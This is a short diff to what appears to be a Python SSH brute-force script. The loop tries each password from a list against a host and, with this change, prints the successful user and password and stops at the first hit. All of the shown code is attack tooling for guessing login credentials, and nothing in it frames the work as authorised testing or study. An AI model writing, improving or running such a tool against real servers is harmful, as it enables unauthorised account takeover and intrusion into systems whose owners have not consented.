@@ -37,7 +37,8 @@ for password in passwords:
 
     try:
         client.connect(hostname=host, username=user , password=password, timeout=3)
-        print(f"the connection was successful with {host}")
+        print(f"the connection was successful with {host}  as   {user}  :   {password}")
+        break
 
     except Exception as e:
-        print(f" the connnection was failed with {host}")
+        print(f" the connnection was failed with {host}  ")
